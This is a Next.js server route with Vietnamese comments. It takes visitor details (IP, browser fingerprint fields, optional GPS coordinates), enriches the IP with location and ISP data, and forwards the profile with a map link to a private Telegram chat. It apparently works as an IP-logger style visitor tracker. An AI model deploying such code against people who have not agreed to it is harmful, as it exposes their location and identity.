import { NextRequest, NextResponse } from "next/server";

export async function POST(req: NextRequest) {
  try {
    const data = await req.json();

    // Lấy thông tin IP từ ip-api
    const ipInfoRes = await fetch(
      `http://ip-api.com/json/${data.ip}?fields=status,message,country,regionName,city,lat,lon,isp,org,as,query`
    );
    const ipInfo = await ipInfoRes.json();

    const visitTime = new Date().toLocaleString("vi-VN", {
      timeZone: "Asia/Ho_Chi_Minh",
    });

    // Chuẩn bị message gửi Telegram
    const message = `
📡 IP: ${ipInfo.query}
🏳️ Country: ${ipInfo.country}
🏙️ City: ${ipInfo.city}
🏢 ISP: ${ipInfo.isp}
🏛️ Org: ${ipInfo.org}
🔢 ASN: ${ipInfo.as}

🖥️ User Agent: ${data.userAgent}
🗣️ Language: ${data.language}
🕒 Timezone: ${data.timezone}
🖼️ Screen: ${data.screen}
↩️ Referrer: ${data.referrer}
📶 Network: ${data.network}
💻 Platform: ${data.platform}
⏰ Visit Time: ${visitTime}
📍 Location: ${
      data.location
        ? `https://www.google.com/maps?q=${data.location.lat},${data.location.lon}`
        : "User denied"
    }
`;

    // Gửi tin nhắn về Telegram
    await fetch(
      `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`,
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: process.env.TELEGRAM_CHAT_ID,
          text: message,
        }),
      }
    );

    return NextResponse.json({ ok: true });
  } catch (err) {
    console.error(err);
    return NextResponse.json({ ok: false, error: "Server error" }, { status: 500 });
  }
}
